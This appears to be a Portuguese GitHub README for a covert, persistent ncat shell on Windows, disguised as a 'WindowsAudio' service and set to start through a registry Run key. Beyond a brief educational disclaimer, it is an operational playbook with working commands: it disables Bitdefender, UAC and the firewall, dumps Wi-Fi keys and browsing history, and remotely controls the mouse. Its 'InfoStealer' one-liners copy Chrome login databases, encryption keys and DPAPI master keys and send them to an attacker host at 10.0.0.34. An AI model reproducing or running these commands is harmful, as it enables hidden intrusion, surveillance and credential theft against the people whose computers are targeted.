# 🖥️ Shell cmd.exe - Windows Promt de Comando

⚠️ **Aviso**
Este projeto é apenas para **fins educacionais e testes autorizados**. O uso indevido é de total responsabilidade do usuário.

Bind Shell reverse persistente no Windows via NCAT (Nmap).

---

## 📋 Requisitos

- Windows 10/11
- Conexão com internet para baixar o WinGet e instalar o Nmap (Se Necessário)
---

## 🚀 O que o Install_Full.bat faz

| Etapa | Descrição |
|-------|-----------|
| 1 | Solicita permissão administrador
| 2 | Instalar o **WinGet** via curl
| 3 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
| 4 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
| 5 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **65534** |
| 6 | Cria `audio.bat` - Executa o .vbs e fecha |
| 7 | Adiciona ao Registro - Inicia junto com Windows (`WindowsAudio`) |
| 8 | Abre a porta 65534 na saida.
| 9 | Sobe o listener imediatamente |

---

## ▶️ Como usar

### 1. Na vítima (Windows)
- `Install_Full.bat` Windows 10 recem instalado, somente com Windows Defender padrão (Shell Persistente)
  
- `Install_Nmap.bat` Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Persistente)
  
- `Install_Shell.bat` Windows 10/11 já com winget, sem nmap, pode ter antivirus instalado, não detecta.
OBS: Após executar o Install_Shell.bat e obter acesso à shell, recomenda-se copiar e colar imediatamente todo o conteúdo do arquivo `Persistência.txt` para manter uma shell persistente.

### 2. No atacante
```bash
# Windows (via ncat)
ncat -lnvp 65534

# Linux (via nc)
nc -lnvp 65534
```

---

## 🔍 Verificar persistência

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"
```

---

## 🗑️ Remoção completa

```cmd
taskkill /f /im ncat.exe
taskkill /f /im wscript.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
rmdir /s /q "%USERPROFILE%\WindowsAudio"
```

---

### ⚠️ Desabilitar Bitdefender (completo)
```cmd
net stop "Bitdefender Virus Shield" /y
net stop "Bitdefender Desktop Update Service" /y
net stop "BitDefender Safebox" /y
sc config "Bitdefender Virus Shield" start= disabled
sc config "Bitdefender Desktop Update Service" start= disabled
taskkill /f /im bdagent.exe 2>nul
taskkill /f /im bdredline.exe 2>nul
```

## 📡 Transferir arquivos

### Enviar arquivo do Linux para o Windows

**No shell Windows conectado:**
```cmd
ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
```

**No Linux (outro terminal):**
```bash
nc IP_VITIMA 5581 < /caminho/do/arquivo.jpg
```

---

## 🔑 Comandos úteis pós-conexão

```cmd
whoami                                         # Ver usuário atual
whoami /groups                                 # Ver grupos/privilégios
tasklist                                       # Listar processos
netstat -ano                                   # Conexões de rede
shutdown /r /t 0                               # Reiniciar
```

### Redes Wi-Fi
```cmd
netsh wlan show profiles                       # Redes salvas
netsh wlan show profile name="REDE" key=clear  # Senha do Wi-Fi
```

### Histórico do navegador
```cmd
# Chrome
findstr /i "http" "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History"

# Edge
findstr /i "http" "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"

# Firefox
findstr /i "http" "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
```

---

## 🔐 Extrair senhas salvas do Chrome

### 1. Visualizar os (Local Data e Local State) usando o type e salva-lo como LoginData.db e LocalState.json
```cmd
cd "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default
type "Login Data"

cd "%USERPROFILE%\AppData\Local\Google\Chrome\User Data
type "Local State"
```

### 2. Instalar dependência no Linux
```bash
pip install pycryptodomex --break-system-packages
```
---

### 3. Script Python para extrair senhas

Crie o arquivo `decode_users_pass.py`:

```python
import sqlite3
import json
import base64
import os

if not os.path.exists('LoginData.db'):
    print("LoginData.db não encontrado!")
    exit()
if not os.path.exists('LocalState.json'):
    print("LocalState.json não encontrado!")
    exit()

with open('LocalState.json', 'r') as f:
    local_state = json.load(f)

try:
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    print(f"Chave extraída (criptografada): {encrypted_key.hex()}")
    print("Agora é preciso descriptografar essa chave no Windows com DPAPI")
except Exception as e:
    print(f"Erro ao extrair chave: {e}")

conn = sqlite3.connect('LoginData.db')
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

print("\n=== LOGINS ENCONTRADOS (SENHAS CRIPTOGRAFADAS) ===\n")
for url, user, pwd in cursor.fetchall():
    if url and user:
        print(f"URL: {url}")
        print(f"Usuário: {user}")
        print(f"Senha (hex): {pwd.hex() if pwd else 'VAZIA'}")
        print("-" * 50)

conn.close()
print("\n[!] Senhas estão criptografadas. A descriptografia completa precisa ser feita no Windows.")
```

Execute:
```bash
python3 decode_users_pass.py
```

### 4. Elevação de Privilégio (Desabilitar UAC)

⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.

🖥️ **Se você executou o `Install_Shell.bat`, copiou e colou todo o script do `Persistência.txt` seu Shell ja é administrador**

**Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.

```powershell
# Desabilita o UAC e reinicia o sistema imediatamente:
powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"

O que acontece:
Abre um pop-up do UAC solicitando permissão administrativa
Se o usuário clicar em "Sim", desabilita o UAC no registro
Reinicia o sistema automaticamente na hora
Após o reboot, qualquer shell terá privilégios administrativos totais

# Para reabilitar o UAC:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0

# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
netsh advfirewall set allprofiles state off

# Para reabilitar firewall:
netsh advfirewall set allprofiles state on

# Verificar status do firewall:
netsh advfirewall show allprofiles

# Verificar se tem privilégios administrativos
whoami /groups | findstr "Administradores"
# Se aparecer "BUILTIN\Administradores - Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo"
# indica Admin completo (UAC desabilitado).

Execute:
```bash
python3 decode_users_pass.py
```

### 5. Display do Windows

**Descobri a resolução da tela:**
```cmd
wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution
```

**Descobrir a posição do mouse:**
```cmd
powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position}"
```

**Mover o mouse para outra posição e dar um clique:**

**OBS: copie o valor y e x da posição do mouse e altere no código abaixo na parte System.Drawing.Point(499,491); para onde deseja clicar.**
```cmd
powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using System; using System.Runtime.InteropServices; public class MouseClick { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo); }'; Add-Type $code; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(499,491); Start-Sleep -Milliseconds 100; [MouseClick]::mouse_event(2,0,0,0,[UIntPtr]::Zero); [MouseClick]::mouse_event(4,0,0,0,[UIntPtr]::Zero)"
```

### 6. InfoStealer - Roubar users do navegador, senha criptografada
### No shell do atacante
``` cmd
nc -lvnp 9999 > chrome_passwords.txt
```

### No shell da vitima
``` cmd
python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
```

### 6.1. InfoStealer - Extrair senha criptografada
### No shell do atacante
``` cmd
nc -lvnp 9999 | tee passwords_full.json
```
### No shell da vitima
``` cmd
echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
echo. >> %TEMP%\final_v2.py
echo # Lê a chave App-Bound do Local State >> %TEMP%\final_v2.py
echo local_state_path = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State' >> %TEMP%\final_v2.py
echo with open(local_state_path, 'r') as f: >> %TEMP%\final_v2.py
echo     local_state = json.load(f) >> %TEMP%\final_v2.py
echo app_bound_key_b64 = local_state['os_crypt']['app_bound_encrypted_key'] >> %TEMP%\final_v2.py
echo print('Chave App-Bound encontrada') >> %TEMP%\final_v2.py
echo. >> %TEMP%\final_v2.py
echo # Extrai senhas >> %TEMP%\final_v2.py
echo login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data' >> %TEMP%\final_v2.py
echo temp_db = tempfile.mktemp(suffix='.db') >> %TEMP%\final_v2.py
echo shutil.copy2(login_data, temp_db) >> %TEMP%\final_v2.py
echo conn = sqlite3.connect(temp_db) >> %TEMP%\final_v2.py
echo cursor = conn.cursor() >> %TEMP%\final_v2.py
echo cursor.execute('SELECT origin_url, username_value, password_value FROM logins') >> %TEMP%\final_v2.py
echo. >> %TEMP%\final_v2.py
echo # Salva em formato JSON >> %TEMP%\final_v2.py
echo output = {'app_bound_key': app_bound_key_b64, 'passwords': []} >> %TEMP%\final_v2.py
echo for url, user, pwd in cursor.fetchall(): >> %TEMP%\final_v2.py
echo     output['passwords'].append({ >> %TEMP%\final_v2.py
echo         'url': url, >> %TEMP%\final_v2.py
echo         'username': user, >> %TEMP%\final_v2.py
echo         'password_b64': base64.b64encode(pwd).decode(), >> %TEMP%\final_v2.py
echo         'password_hex': pwd.hex(), >> %TEMP%\final_v2.py
echo         'prefix': pwd[:4].hex() >> %TEMP%\final_v2.py
echo     }) >> %TEMP%\final_v2.py
echo conn.close() >> %TEMP%\final_v2.py
echo os.unlink(temp_db) >> %TEMP%\final_v2.py
echo. >> %TEMP%\final_v2.py
echo result = json.dumps(output, indent=2) >> %TEMP%\final_v2.py
echo print(result) >> %TEMP%\final_v2.py
echo. >> %TEMP%\final_v2.py
echo # Envia >> %TEMP%\final_v2.py
echo try: >> %TEMP%\final_v2.py
echo     s = socket.socket(); s.settimeout(10) >> %TEMP%\final_v2.py
echo     s.connect(('10.0.0.34', 9999)); s.send(result.encode()); s.close() >> %TEMP%\final_v2.py
echo     print('ENVIADO!') >> %TEMP%\final_v2.py
echo except Exception as e: >> %TEMP%\final_v2.py
echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
```

### Depois rode na vitima
``` cmd
python %TEMP%\final_v2.py
```

### 6.2. InfoStealer - Extrair blob DPAPI descriptografado

### Estrair as Master Key do Navegador Chrome
### No shell do atacante
``` cmd
nc -lvnp 9999 > master_keys.zip
```
### No shell da vitima
``` cmd
python -c "import os, socket, shutil; protect_path = os.environ['APPDATA'] + r'\Microsoft\Protect'; shutil.make_archive(r'%TEMP%\master_keys', 'zip', protect_path); s = socket.socket(); s.connect(('10.0.0.34', 9999)); f = open(r'%TEMP%\master_keys.zip', 'rb'); s.send(f.read()); f.close(); s.close(); print('Master Keys enviadas!')"
```
### 7.0. AGORA É COM VOCÊ USE (MIMIKTZ) github.com/gentilkiwi/mimikatz
